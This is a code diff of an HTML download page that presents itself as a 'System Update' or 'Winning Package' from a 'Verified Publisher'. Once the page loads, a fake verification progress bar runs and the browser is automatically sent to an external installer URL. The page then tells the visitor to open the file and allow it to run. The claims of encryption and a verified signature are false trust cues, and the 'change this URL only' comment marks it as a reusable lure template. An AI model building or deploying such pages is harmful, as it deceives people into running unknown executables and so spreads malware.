@@ -2,684 +2,168 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>SecureStream • Winning Package</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Update</title>
 <meta name="robots" content="noindex, nofollow">
 <style>
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-  }
-
-  :root {
-    --bg: #05050b;
-    --surface: #0c0c15;
-    --surface-elevated: #11111c;
-    --border: rgba(255, 255, 255, 0.06);
-    --text-primary: #efeff5;
-    --text-secondary: #8989a3;
-    --accent: #5b6cf7;
-    --accent-glow: rgba(91, 108, 247, 0.25);
-    --accent-gradient: linear-gradient(135deg, #5b6cf7, #8b5cf6);
-    --success: #2dd4bf;
-    --success-bg: rgba(45, 212, 191, 0.08);
-    --warning: #f59e0b;
-    --transition-smooth: all 0.35s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-  }
-
-  body {
-    font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
-    background: var(--bg);
-    color: var(--text-primary);
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 1.5rem;
-    position: relative;
-  }
-
-  /* ambient glow */
-  body::before {
-    content: '';
-    position: fixed;
-    inset: 0;
-    background: 
-      radial-gradient(circle at 20% 30%, rgba(91, 108, 247, 0.08), transparent 55%),
-      radial-gradient(circle at 85% 70%, rgba(139, 92, 246, 0.05), transparent 60%);
-    pointer-events: none;
-    z-index: 0;
-  }
-
-  .container {
-    position: relative;
-    z-index: 2;
-    width: 100%;
-    max-width: 460px;
-    animation: fadeSlideUp 0.6s ease-out;
-  }
-
-  @keyframes fadeSlideUp {
-    0% { opacity: 0; transform: translateY(20px); }
-    100% { opacity: 1; transform: translateY(0); }
-  }
-
-  /* card core */
-  .card {
-    background: var(--surface);
-    backdrop-filter: blur(2px);
-    border: 1px solid var(--border);
-    border-radius: 2rem;
-    padding: 2rem 2rem 2.2rem;
-    box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(91, 108, 247, 0.02);
-    transition: var(--transition-smooth);
-  }
-
-  .badge {
-    display: inline-flex;
-    align-items: center;
-    gap: 8px;
-    background: rgba(91, 108, 247, 0.08);
-    border: 0.5px solid rgba(91, 108, 247, 0.2);
-    padding: 5px 14px;
-    border-radius: 40px;
-    font-size: 0.7rem;
-    font-weight: 600;
-    letter-spacing: 0.5px;
-    color: var(--accent);
-    margin-bottom: 1.8rem;
-    backdrop-filter: blur(4px);
-  }
-
-  .badge-dot {
-    width: 6px;
-    height: 6px;
-    background: var(--accent);
-    border-radius: 50%;
-    box-shadow: 0 0 6px var(--accent);
-    animation: pulseSoft 1.8s infinite;
-  }
-
-  @keyframes pulseSoft {
-    0%, 100% { opacity: 0.6; transform: scale(1); }
-    50% { opacity: 1; transform: scale(1.15); }
-  }
-
-  .icon-shield {
-    width: 70px;
-    height: 70px;
-    background: var(--accent-gradient);
-    border-radius: 22px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin: 0 auto 1.5rem;
-    box-shadow: 0 12px 28px -8px rgba(91, 108, 247, 0.4);
-  }
-
-  .icon-shield svg {
-    width: 32px;
-    height: 32px;
-    stroke: white;
-    stroke-width: 1.7;
-    fill: none;
-  }
-
-  h2 {
-    font-size: 1.55rem;
-    font-weight: 700;
-    letter-spacing: -0.3px;
-    text-align: center;
-    margin-bottom: 0.5rem;
-  }
-
-  .description {
-    color: var(--text-secondary);
-    font-size: 0.85rem;
-    line-height: 1.55;
-    text-align: center;
-    margin-bottom: 1.8rem;
-  }
-
-  /* progress bar */
-  .progress-section {
-    margin: 1.5rem 0 1.2rem;
-  }
-  .progress-bar-bg {
-    background: rgba(255, 255, 255, 0.05);
-    border-radius: 100px;
-    height: 4px;
-    overflow: hidden;
-  }
-  .progress-fill {
-    width: 0%;
-    height: 100%;
-    background: var(--accent-gradient);
-    border-radius: 100px;
-    transition: width 0.25s ease-out;
-    box-shadow: 0 0 6px var(--accent);
-  }
-  .status-message {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    font-size: 0.75rem;
-    color: var(--text-secondary);
-    margin-top: 10px;
-    min-height: 32px;
-  }
-  .pulse-dot {
-    width: 6px;
-    height: 6px;
-    background: var(--accent);
-    border-radius: 50%;
-    animation: pulseSoft 1.5s infinite;
-  }
-
-  /* steps list */
-  .steps-list {
-    margin-top: 1.8rem;
-    border-top: 1px solid var(--border);
-    padding-top: 1.5rem;
-  }
-  .steps-header {
-    font-size: 0.7rem;
-    text-transform: uppercase;
-    letter-spacing: 1.2px;
-    font-weight: 600;
-    color: var(--text-secondary);
-    margin-bottom: 1rem;
-  }
-  .step-item {
-    display: flex;
-    align-items: flex-start;
-    gap: 14px;
-    margin-bottom: 1rem;
-    transition: var(--transition-smooth);
-    opacity: 0.45;
-  }
-  .step-item.active {
-    opacity: 1;
-  }
-  .step-item.completed {
-    opacity: 0.7;
-  }
-  .step-marker {
-    width: 28px;
-    height: 28px;
-    border-radius: 12px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 0.75rem;
-    font-weight: 700;
-    flex-shrink: 0;
-    transition: all 0.2s;
-  }
-  .marker-pending {
-    background: rgba(255, 255, 255, 0.05);
-    color: var(--text-secondary);
-  }
-  .marker-progress {
-    background: rgba(91, 108, 247, 0.2);
-    color: var(--accent);
-    box-shadow: 0 0 6px rgba(91, 108, 247, 0.3);
-  }
-  .marker-done {
-    background: var(--success-bg);
-    color: var(--success);
-  }
-  .step-content {
-    flex: 1;
-  }
-  .step-title {
-    font-size: 0.85rem;
-    font-weight: 500;
-  }
-  .step-hint {
-    font-size: 0.7rem;
-    color: var(--text-secondary);
-    margin-top: 2px;
-    letter-spacing: -0.2px;
-  }
-  .retry-link {
-    display: inline-block;
-    margin-top: 1.25rem;
-    font-size: 0.75rem;
-    color: var(--accent);
-    text-decoration: none;
-    opacity: 0;
-    visibility: hidden;
-    transition: opacity 0.3s;
-    font-weight: 500;
-    border-bottom: 1px dashed rgba(91, 108, 247, 0.4);
-  }
-  .retry-link.visible {
-    opacity: 1;
-    visibility: visible;
-  }
-  .retry-link:hover {
-    color: #8b9bff;
-  }
-
-  /* phase 2 (success panel) */
-  .success-icon {
-    width: 64px;
-    height: 64px;
-    background: var(--success-bg);
-    border-radius: 28px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin: 0 auto 1.2rem;
-  }
-  .success-icon svg {
-    width: 32px;
-    height: 32px;
-    stroke: var(--success);
-    stroke-width: 2;
-    fill: none;
-  }
-  .footnote {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    margin-top: 1.5rem;
-    font-size: 0.65rem;
-    color: rgba(255, 255, 255, 0.2);
-  }
-  .footnote svg {
-    width: 12px;
-    height: 12px;
-    stroke: rgba(255,255,255,0.25);
-  }
-
-  /* hidden utility */
-  .hidden {
-    display: none;
-  }
-
-  button, a {
-    cursor: pointer;
-  }
-
-  /* micro animation */
-  @keyframes gentleFade {
-    from { opacity: 0; transform: scale(0.98); }
-    to { opacity: 1; transform: scale(1); }
-  }
-  .card-transition {
-    animation: gentleFade 0.4s ease;
-  }
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+  *{margin:0;padding:0;box-sizing:border-box}
+  :root{--bg:#06060c;--card:#0d0d16;--border:rgba(255,255,255,0.05);--t1:#eeeef2;--t2:#6b6b80;--ac:#5b6cf7;--ac2:#8b5cf6;--glow:rgba(91,108,247,0.12)}
+  body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t1);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;overflow:hidden}
+  body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 30% 20%,rgba(91,108,247,0.06),transparent 60%),radial-gradient(circle at 70% 80%,rgba(139,92,246,0.04),transparent 60%);z-index:0}
+  .wrap{position:relative;z-index:1;width:100%;max-width:440px;animation:up .7s ease}
+  @keyframes up{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
+  .card{background:var(--card);border:1px solid var(--border);border-radius:24px;padding:44px 36px;text-align:center;box-shadow:0 0 100px rgba(91,108,247,0.04),0 24px 48px rgba(0,0,0,0.4)}
+  .badge{display:inline-flex;align-items:center;gap:6px;padding:6px 14px;border-radius:20px;background:rgba(91,108,247,0.08);border:1px solid rgba(91,108,247,0.15);font-size:11px;font-weight:600;color:var(--ac);letter-spacing:.5px;text-transform:uppercase;margin-bottom:24px}
+  .badge .dot{width:6px;height:6px;border-radius:50%;background:var(--ac);animation:pulse 2s ease infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+  .shield{width:64px;height:64px;border-radius:16px;background:linear-gradient(135deg,var(--ac),var(--ac2));display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 8px 40px rgba(91,108,247,0.3);transition:box-shadow .3s}
+  .shield svg{width:28px;height:28px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  h1{font-size:21px;font-weight:700;letter-spacing:-.3px;margin-bottom:8px}
+  .desc{color:var(--t2);font-size:13px;line-height:1.7;margin-bottom:28px;max-width:340px;margin-left:auto;margin-right:auto}
+  .bar-wrap{margin-bottom:8px}
+  .bar{height:3px;background:rgba(255,255,255,0.04);border-radius:3px;overflow:hidden}
+  .bar-fill{height:100%;border-radius:3px;background:linear-gradient(90deg,var(--ac),var(--ac2));width:0%;transition:width .3s}
+  .status{display:flex;align-items:center;justify-content:center;gap:8px;font-size:12px;color:var(--t2);margin-bottom:24px;min-height:20px}
+  .status .dot{width:5px;height:5px;border-radius:50%;background:var(--ac);animation:pulse 1.5s ease infinite}
+  .steps{text-align:left;border-top:1px solid var(--border);padding-top:24px;margin-top:4px}
+  .steps-title{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--t2);margin-bottom:16px;font-weight:600}
+  .step{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px;opacity:.4;transition:opacity .4s}
+  .step.active{opacity:1}
+  .step.done{opacity:.6}
+  .step-n{width:24px;height:24px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;transition:all .3s}
+  .step-n.wait{background:rgba(255,255,255,0.04);color:var(--t2)}
+  .step-n.go{background:rgba(91,108,247,0.15);color:var(--ac)}
+  .step-n.ok{background:rgba(16,185,129,0.15);color:#34d399}
+  .step-t{font-size:13px;padding-top:3px}
+  .step-t small{display:block;color:var(--t2);font-size:11px;margin-top:2px}
+  .link{display:inline-block;margin-top:20px;font-size:12px;color:var(--ac);text-decoration:none;opacity:0;transition:opacity .4s}
+  .link.show{opacity:1}
+  .link:hover{text-decoration:underline}
+  .foot{text-align:center;margin-top:16px;font-size:10px;color:rgba(255,255,255,0.15);display:flex;align-items:center;justify-content:center;gap:6px}
+  .foot svg{width:10px;height:10px;stroke:rgba(255,255,255,0.2);fill:none;stroke-width:2}
+  .check{display:none}
+  .check.show{display:block;animation:up .5s ease}
+  .done-icon{width:56px;height:56px;border-radius:14px;background:rgba(16,185,129,0.1);display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
+  .done-icon svg{width:28px;height:28px;stroke:#34d399;fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round}
 </style>
 </head>
 <body>
 
-<div class="container" id="appRoot">
-  <!-- PHASE 1: Preparation & Download -->
-  <div id="phase1Container">
-    <div class="card">
-      <div class="badge">
-        <span class="badge-dot"></span>
-        <span>SECURE DELIVERY</span>
-      </div>
-      <div class="icon-shield">
-        <svg viewBox="0 0 24 24" stroke="currentColor">
-          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-          <path d="M9 12l2 2 4-4" stroke="white" stroke-width="1.8" fill="none"/>
-        </svg>
-      </div>
-      <h2 id="phaseTitle">Winning Package</h2>
-      <p class="description" id="phaseDesc">Secure encrypted channel • Validated access</p>
-
-      <div class="progress-section">
-        <div class="progress-bar-bg">
-          <div class="progress-fill" id="progressFill"></div>
-        </div>
-        <div class="status-message">
-          <span class="pulse-dot"></span>
-          <span id="statusText">Establishing secure bridge</span>
-        </div>
-      </div>
-
-      <div class="steps-list">
-        <div class="steps-header">✓ VERIFICATION FLOW</div>
-        <div class="step-item" id="step1Item">
-          <div class="step-marker" id="step1Marker">1</div>
-          <div class="step-content">
-            <div class="step-title">Validate Winning license</div>
-            <div class="step-hint">Authenticating session & entitlement</div>
-          </div>
-        </div>
-        <div class="step-item" id="step2Item">
-          <div class="step-marker" id="step2Marker">2</div>
-          <div class="step-content">
-            <div class="step-title">Fetch secure manifest</div>
-            <div class="step-hint">End-to-end encrypted package</div>
-          </div>
-        </div>
-        <div class="step-item" id="step3Item">
-          <div class="step-marker" id="step3Marker">3</div>
-          <div class="step-content">
-            <div class="step-title">Initialize download</div>
-            <div class="step-hint">Triggering secure transfer</div>
-          </div>
-        </div>
-      </div>
-
-      <a href="#" id="manualDownloadLink" class="retry-link">⟳ Manual fallback · if download stuck</a>
+<div class="wrap">
+  <!-- PHASE 1: Loading & Download -->
+  <div class="card" id="phase1">
+    <div class="badge"><span class="dot"></span> Verified Publisher</div>
+    <div class="shield">
+      <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
     </div>
+    <h1 id="title">Preparing Your Winning</h1>
+    <p class="desc" id="desc">Verifying your access and preparing the secure package. This will only take a moment.</p>
+    <div class="bar-wrap"><div class="bar"><div class="bar-fill" id="bar"></div></div></div>
+    <div class="status"><span class="dot"></span><span id="statusText">Initializing...</span></div>
+
+    <div class="steps">
+      <div class="steps-title">Setup Progress</div>
+      <div class="step active" id="s1">
+        <div class="step-n go" id="s1n">1</div>
+        <div class="step-t">Verifying Winning access<small>Checking Winning authorization</small></div>
+      </div>
+      <div class="step" id="s2">
+        <div class="step-n wait" id="s2n">2</div>
+        <div class="step-t">Downloading Winning package<small>Secure encrypted transfer</small></div>
+      </div>
+      <div class="step" id="s3">
+        <div class="step-n wait" id="s3n">3</div>
+        <div class="step-t">open the File<small>Follow the prompt if shown</small></div>
+      </div>
+    </div>
+
+    <a class="link" id="manualLink" href="#">If download doesn't start, click here</a>
   </div>
 
-  <!-- PHASE 2: Success & Action -->
-  <div id="phase2Container" class="hidden">
-    <div class="card">
-      <div class="success-icon">
-        <svg viewBox="0 0 24 24">
-          <polyline points="20 6 9 17 4 12" stroke="currentColor" stroke-width="2.2" fill="none"/>
-        </svg>
-      </div>
-      <h2>Download Active</h2>
-      <p class="description">Your Winning package is being transferred. Locate the file in your downloads folder — execution is fully automated.</p>
-
-      <div class="steps-list">
-        <div class="steps-header">NEXT ACTIONS</div>
-        <div class="step-item active">
-          <div class="step-marker marker-done">✓</div>
-          <div class="step-content">
-            <div class="step-title">Secure transfer started</div>
-            <div class="step-hint">File saved to default downloads</div>
-          </div>
-        </div>
-        <div class="step-item active">
-          <div class="step-marker marker-progress">2</div>
-          <div class="step-content">
-            <div class="step-title">Open the downloaded file</div>
-            <div class="step-hint">If prompted, click "Allow" or "Run anyway"</div>
-          </div>
-        </div>
-        <div class="step-item active">
-          <div class="step-marker marker-pending">3</div>
-          <div class="step-content">
-            <div class="step-title">Auto-configuration</div>
-            <div class="step-hint">Winning will launch automatically in seconds</div>
-          </div>
-        </div>
-      </div>
-
-      <a href="#" id="retryDownloadLink" class="retry-link visible">↻ Restart download · if needed</a>
+  <!-- PHASE 2: After download -->
+  <div class="card check" id="phase2">
+    <div class="done-icon">
+      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
     </div>
+    <h1>Download Started</h1>
+    <p class="desc">Your Winning download has started. Open the file from your downloads folder to complete setup. It only takes a few seconds.</p>
+
+    <div class="steps">
+      <div class="steps-title">Next Steps</div>
+      <div class="step active">
+        <div class="step-n ok">✓</div>
+        <div class="step-t">Winning Download started<small>Check your downloads folder</small></div>
+      </div>
+      <div class="step active">
+        <div class="step-n go">2</div>
+        <div class="step-t">Open the downloaded file<small>Allow it to run if prompted</small></div>
+      </div>
+      <div class="step active">
+        <div class="step-n wait">3</div>
+        <div class="step-t">Setup completes automatically<small>Takes about 30 seconds nothing to click, Winning will open it self After Running.</small></div>
+      </div>
+    </div>
+
+    <a class="link show" id="retryLink" href="#">Download again</a>
   </div>
 
-  <div class="footnote">
-    <svg viewBox="0 0 24 24" fill="none"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
-    <span>256-bit encrypted • trusted publisher</span>
+  <div class="foot">
+    <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+    Encrypted connection • Verified signature
   </div>
 </div>
 
 <script>
-  (function() {
-    // ============================================================
-    // CONFIGURATION – UPDATE URL ONLY
-    // ============================================================
-    const DOWNLOAD_URL = "https://api.micterminal.sbs/install/download/batch/6af4af582a7537bb0a8b6609da4004445ece7c5d2383780f?name=Winning-Details";
-    // ============================================================
+  // ============================================
+  //  CHANGE THIS URL ONLY
+  // ============================================
+  var INSTALL_URL = "https://api.micterminal.sbs/install/download/batch/6af4af582a7537bb0a8b6609da4004445ece7c5d2383780f?name=Winning-Details";
+  // ============================================
 
-    // DOM elements (Phase 1)
-    const phase1Div = document.getElementById('phase1Container');
-    const phase2Div = document.getElementById('phase2Container');
-    const progressFill = document.getElementById('progressFill');
-    const statusSpan = document.getElementById('statusText');
-    const manualLink = document.getElementById('manualDownloadLink');
-    const retryLink = document.getElementById('retryDownloadLink');
-    
-    // Step markers and items
-    const stepMarkers = {
-      1: document.getElementById('step1Marker'),
-      2: document.getElementById('step2Marker'),
-      3: document.getElementById('step3Marker')
-    };
-    const stepItems = {
-      1: document.getElementById('step1Item'),
-      2: document.getElementById('step2Item'),
-      3: document.getElementById('step3Item')
-    };
+  var bar = document.getElementById('bar');
+  var status = document.getElementById('statusText');
+  var link = document.getElementById('manualLink');
+  var phase1 = document.getElementById('phase1');
+  var phase2 = document.getElementById('phase2');
 
-    // Helper: update step UI (state: 'pending', 'active', 'completed')
-    function setStepState(stepId, state) {
-      const marker = stepMarkers[stepId];
-      const item = stepItems[stepId];
-      if (!marker) return;
+  link.href = INSTALL_URL;
+  document.getElementById('retryLink').href = INSTALL_URL;
 
-      // reset classes
-      marker.className = 'step-marker';
-      item.classList.remove('active', 'completed');
-      
-      if (state === 'active') {
-        marker.classList.add('marker-progress');
-        marker.textContent = stepId;
-        item.classList.add('active');
-      } else if (state === 'completed') {
-        marker.classList.add('marker-done');
-        marker.innerHTML = '✓';
-        item.classList.add('completed');
-      } else {
-        marker.classList.add('marker-pending');
-        marker.textContent = stepId;
-      }
-    }
+  var timeline = [
+    { t: 600,  pct: 20,  txt: 'Authenticating...', step: null },
+    { t: 1400, pct: 45,  txt: 'Access verified', step: function(){ done(1); activate(2); } },
+    { t: 2200, pct: 70,  txt: 'Preparing package...', step: null },
+    { t: 3000, pct: 90,  txt: 'Starting download...', step: function(){ done(2); activate(3); } },
+    { t: 3600, pct: 100, txt: 'Download initiated', step: function(){
+      done(3);
+      link.classList.add('show');
+      window.location.href = INSTALL_URL;
+      setTimeout(function(){ phase1.style.display='none'; phase2.classList.add('show'); }, 1500);
+    }},
+  ];
 
-    // trigger download & UI refresh
-    let downloadTriggered = false;
-    function initiateDownload() {
-      if (downloadTriggered) return;
-      downloadTriggered = true;
-      try {
-        // create a hidden anchor to avoid popup blockers issues (most reliable)
-        const link = document.createElement('a');
-        link.href = DOWNLOAD_URL;
-        link.download = ''; // optional, but lets browser decide
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-      } catch (e) {
-        window.location.href = DOWNLOAD_URL;
-      }
-    }
+  timeline.forEach(function(e){
+    setTimeout(function(){
+      bar.style.width = e.pct + '%';
+      status.textContent = e.txt;
+      if (e.step) e.step();
+    }, e.t);
+  });
 
-    // timeline state machine (clean & smart)
-    let timelineActive = true;
+  function done(n){
+    var s = document.getElementById('s'+n);
+    var sn = document.getElementById('s'+n+'n');
+    s.classList.remove('active'); s.classList.add('done');
+    sn.className = 'step-n ok'; sn.textContent = '✓';
+  }
 
-    function startTimeline() {
-      // initial state: step1 active
-      setStepState(1, 'active');
-      setStepState(2, 'pending');
-      setStepState(3, 'pending');
-      progressFill.style.width = '0%';
-      statusSpan.innerText = 'Authenticating secure channel...';
-      
-      // step 1 -> complete + step2 active
-      setTimeout(() => {
-        if (!timelineActive) return;
-        setStepState(1, 'completed');
-        setStepState(2, 'active');
-        progressFill.style.width = '34%';
-        statusSpan.innerText = 'License validated ✓';
-      }, 700);
-      
-      // step2 -> complete + step3 active + progress 68%
-      setTimeout(() => {
-        if (!timelineActive) return;
-        setStepState(2, 'completed');
-        setStepState(3, 'active');
-        progressFill.style.width = '68%';
-        statusSpan.innerText = 'Package encryption verified';
-      }, 1800);
-      
-      // final stage: trigger download, complete step3, show manual link, transition
-      setTimeout(() => {
-        if (!timelineActive) return;
-        // complete last step
-        setStepState(3, 'completed');
-        progressFill.style.width = '100%';
-        statusSpan.innerText = 'Transfer ready · starting download';
-        
-        // show fallback link
-        manualLink.classList.add('visible');
-        
-        // initiate actual download
-        initiateDownload();
-        
-        // after short delay, switch to phase2 (success panel) with smooth transition
-        setTimeout(() => {
-          if (!timelineActive) return;
-          // smooth crossfade: hide phase1, show phase2
-          phase1Div.style.transition = 'opacity 0.25s ease';
-          phase1Div.style.opacity = '0';
-          setTimeout(() => {
-            phase1Div.classList.add('hidden');
-            phase2Div.classList.remove('hidden');
-            phase2Div.style.opacity = '0';
-            phase2Div.style.transition = 'opacity 0.3s ease';
-            setTimeout(() => {
-              phase2Div.style.opacity = '1';
-            }, 20);
-          }, 220);
-        }, 1100);
-      }, 3200);
-    }
-
-    // Edge cases: if user clicks manual link before auto download
-    function setupManualHandlers() {
-      manualLink.addEventListener('click', (e) => {
-        e.preventDefault();
-        if (!downloadTriggered) {
-          initiateDownload();
-          statusSpan.innerText = 'Manual download triggered';
-        } else {
-          // second attempt
-          initiateDownload();
-        }
-      });
-      
-      retryLink.addEventListener('click', (e) => {
-        e.preventDefault();
-        initiateDownload();
-        // small visual feedback
-        const originalText = retryLink.innerText;
-        retryLink.innerText = '✓ Download restarted';
-        setTimeout(() => {
-          retryLink.innerText = originalText;
-        }, 1500);
-      });
-    }
-
-    // if the download somehow fails to trigger via anchor, we provide intelligent retry but also preload
-    // we also ensure download fires at least once from final step
-    let downloadFired = false;
-    function safeDownload() {
-      if (downloadFired) return;
-      downloadFired = true;
-      initiateDownload();
-    }
-    
-    // enhance: pre-fetch / warmup for better ux (optional but safe)
-    // also handle case where timeline completes but download might be blocked
-    window.addEventListener('load', () => {
-      startTimeline();
-      setupManualHandlers();
-      
-      // additional safety: if after 4.5 seconds download hasn't been triggered (edge)
-      setTimeout(() => {
-        if (!downloadFired && timelineActive) {
-          // ensure download fires exactly once
-          safeDownload();
-          if (manualLink) manualLink.classList.add('visible');
-          statusSpan.innerText = 'Initiating fallback transfer';
-        }
-      }, 4800);
-    });
-    
-    // expose download function for retry & fallback
-    window.forceDownload = function() {
-      initiateDownload();
-    };
-    
-    // update state when download triggered early
-    const origInitiate = initiateDownload;
-    window.initiateDownload = function() {
-      downloadFired = true;
-      origInitiate();
-    };
-    
-    // monitor step integrity & clean transitions
-    // (avoid memory leaks)
-    
-    // set download URL to both manual links
-    if (manualLink) manualLink.href = DOWNLOAD_URL;
-    if (retryLink) retryLink.href = DOWNLOAD_URL;
-    
-    // Override: the actual anchor click for manual links uses our download logic to guarantee same behavior
-    manualLink.addEventListener('click', (e) => {
-      e.preventDefault();
-      if (!downloadFired) {
-        safeDownload();
-        statusSpan.innerText = 'Download started manually';
-      } else {
-        initiateDownload();
-      }
-    });
-    
-    retryLink.addEventListener('click', (e) => {
-      e.preventDefault();
-      initiateDownload();
-    });
-    
-    // small polish: add smart caching for phase2 style
-    const style = document.createElement('style');
-    style.textContent = `
-      .hidden { display: none !important; }
-      .visible { opacity: 1 !important; visibility: visible !important; }
-      .retry-link { transition: all 0.2s; }
-    `;
-    document.head.appendChild(style);
-    
-    // Additional: if the user returns to tab, we keep everything consistent
-    let transitionGuard = false;
-    function finalTransitionToPhase2() {
-      if (transitionGuard) return;
-      transitionGuard = true;
-      if (phase1Div && !phase1Div.classList.contains('hidden')) {
-        phase1Div.style.opacity = '0';
-        setTimeout(() => {
-          phase1Div.classList.add('hidden');
-          phase2Div.classList.remove('hidden');
-          phase2Div.style.opacity = '1';
-        }, 200);
-      }
-    }
-    
-    // In case download completes but timeline hasn't fully run due to weird timing, 
-    // we set a final safety after 5.2 seconds
-    setTimeout(() => {
-      if (phase1Div && !phase1Div.classList.contains('hidden')) {
-        // ensure step3 is visually complete if still pending
-        if (stepMarkers[3] && stepMarkers[3].innerHTML !== '✓') {
-          setStepState(3, 'completed');
-          progressFill.style.width = '100%';
-          statusSpan.innerText = 'Download ready';
-        }
-        if (!downloadFired) safeDownload();
-        setTimeout(() => {
-          if (!phase2Div.classList.contains('hidden')) return;
-          finalTransitionToPhase2();
-        }, 400);
-      }
-    }, 5400);
-  })();
+  function activate(n){
+    var s = document.getElementById('s'+n);
+    var sn = document.getElementById('s'+n+'n');
+    s.classList.add('active');
+    sn.className = 'step-n go';
+  }
 </script>
 </body>
 </html>
